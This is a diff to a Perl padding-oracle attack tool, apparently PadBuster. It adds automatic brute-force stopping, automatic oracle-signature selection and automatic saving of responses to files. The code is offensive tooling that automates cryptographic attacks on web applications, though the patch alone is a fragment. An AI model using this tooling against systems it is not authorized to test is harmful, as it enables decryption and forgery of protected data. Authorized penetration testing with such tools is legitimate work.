@@ -43,6 +43,8 @@ GetOptions( "log:s" => \my $logging,
             "randomize" => \my $randomize,
             "ignoredistance=s" => \my $ignoreDistance,
             "usebody" => \my $useBody,
+            "auto=s" => \my $auto,
+            "autostore=s" => \my $autoStore,
             "runafter=s" => \my $runAfter,
             "verbose" => \my $verbose);
   
@@ -87,6 +89,8 @@ Options:
 	 -randomize: Randomize brute force attempts (similar to Web.config bruter)
 	 -ignoredistance [Levenshtein distance]: Ignore responses with smaller distance
 	 -usebody: Use response body content for response analysis phase
+	 -auto [maxrequests]: Automatic decision making and stopping after maxrequests
+	 -autostore [fileprefix]: Automatic storing to files (replaces #ATT, #STAT, #SUM)
 	 -runafter [cmd]: Command to run after finished encryption (replaces XXX, YYY)
          -verbose: Be Verbose
          -veryverbose: Be Very Verbose (Debug Only)
@@ -248,7 +252,11 @@ if ($bruteForce)
 	  my $repeat = 0;
 	  for my $b (0 ... 255)
 	  {
-  	   $bfAttempts++;  	   
+  	   $bfAttempts++;
+	   if($auto && $bfAttempts > $auto) {
+		   myPrint("\nStopping after reaching maximal number of requests ($bfAttempts)\n",0);
+		   goto ENDBFLOOP;
+	   }
   	   if ($resumeBlock && ( $bfAttempts < ($resumeBlock - ($resumeBlock % 256)+1) ) )
 	   {
 		   #SKIP
@@ -256,7 +264,7 @@ if ($bruteForce)
 	   else 
 	   {
 		   my $testBytes = chr($b).$testVal;
-		   if($#oracleSignatures >= 0 && $randomize || $#oracleSignatures < 0 && $printStats) {
+		   if($#oracleSignatures >= 0 && $randomize || $#oracleSignatures < 0 && $printStats > 0) {
 				for (1 .. ($blockSize-3)) {
 					$testBytes .= chr(int(rand(256)));
 				}
@@ -285,9 +293,11 @@ if ($bruteForce)
 			$responseFileBuffer{$signatureData} = "Status: $status\nLocation: $location\nContent-Length: $contentLength\nContent:\n$content";
 			if ($b == 255)
 			{
-				myPrint("*** Response Analysis Complete ***\n",0);
-				determineSignature();
-				$printStats = 1;
+				if (!$auto || $printStats > 4) {
+					myPrint("*** Response Analysis Complete ***\n",0);
+					determineSignature();
+				}
+				$printStats++;
 				$timeTracker = 0;
 				$requestTracker = 0;
 				$repeat = 1;
@@ -307,6 +317,16 @@ if ($bruteForce)
 			if (!$ignoreDistance || $distance > $ignoreDistance) {
 				myPrint($strAttempt,0);
 				writeFile("Summary.txt", "# $strAttempt");
+				if ($autoStore) {
+					my $filename = "$autoStore";
+					my $chksum = unpack( '%32A*', $content );
+					if (!(($filename =~ s/#ATT/$bfAttempts/g) | ($filename =~ s/#STAT/$status/g) | ($filename =~ s/#SUM/$chksum/g))) {
+						goto ENDBFLOOP;  # Finish after storing to a static filename
+					}
+					open(OUTFILE, ">$filename") or die "ERROR: Can't write to file $filename\n";
+					print OUTFILE $content;
+					close(OUTFILE);
+				}
 			}
 			writeFile("Brute_Force_Attempt_".$bfAttempts.".txt", "URL: $testUrl\nPost Data: $testPost\nCookies: $testCookies\n\nStatus: $status\nLocation: $location\nContent-Length: $contentLength ($contentRealLength)\nDistance: $distance\nContent:\n$content");
 		   }
@@ -314,7 +334,8 @@ if ($bruteForce)
 	  }
 	  ($repeat == 1) ? ($complete = 0) : ($complete = 1);
 	 } 
-	}  
+	}
+ENDBFLOOP:
 }
 elsif ($plainTextInput)
 {
@@ -486,7 +507,16 @@ sub determineSignature()
 	} 
 	else 
 	{
-		my @oracleNums = split(/[,\s]+/, &promptUser("\nEnter a comma separated list of IDs that match the error condition\nNOTE: The ID# marked with ** is recommended",''));
+		my @oracleNums;
+		if ($auto) {
+			if ($bruteForce) {
+			    @oracleNums =1..($#sortedGuesses+1);  # Auto select all
+			} else {
+			    @oracleNums =($#sortedGuesses+1);  # Auto select recommended
+			}
+		} else {
+		    @oracleNums =split(/[,\s]+/, &promptUser("\nEnter a comma separated list of IDs that match the error condition\nNOTE: The ID# marked with ** is recommended",''));
+		}
 		for (@oracleNums) {
 			push(@oracleSignatures, @sortedGuesses[$_-1]);
 		}
@@ -599,8 +629,7 @@ sub processBlock
 				my ($status, $content, $location, $contentLength) = makeRequest($method, $testUrl, $testPost, $testCookies);
 
 				
-				my $signatureData = "$status\t$contentLength\t$location";
-				$useBody ? ($signatureData = "$status\t$contentLength\t$location\t$content") : "";
+				my $signatureData = $useBody ? "$status\t$contentLength\t$location\t$content" : "$status\t$contentLength\t$location";
 				
 				# If this is the first block and there is no padding error message defined, then cycle through 
 				# all possible requests and let the user decide what the padding error behavior is.
@@ -703,8 +732,10 @@ sub processBlock
 						$continue = &promptUser("Do you want to start this block over? (Yes/No)? [y/n/a]","",1);
 						if ($continue ne "n")
 						{
-							myPrint("INFO: Switching to interactive mode",0);
-							$interactive = 1;
+							if ($continue ne "a") {
+								myPrint("INFO: Switching to interactive mode",0);
+								$interactive = 1;
+							}
 							$repeat = 1;
 							last OUTERLOOP;
 						}					
@@ -725,10 +756,12 @@ sub processBlock
 						myPrint("[+] instead of the automated response analysis.\n",0);
 					}
 					$continue = &promptUser("Do you want to start this block over? (Yes/No)? [y/n/a]","",1);
-					if ($continue eq "y")
+					if ($continue ne "n")
 					{
-						myPrint("INFO: Switching to interactive mode",0);
-						$interactive = 1;
+						if ($continue ne "a") {
+							myPrint("INFO: Switching to interactive mode",0);
+							$interactive = 1;
+						}
 						$repeat = 1;
 						last OUTERLOOP;
 					}
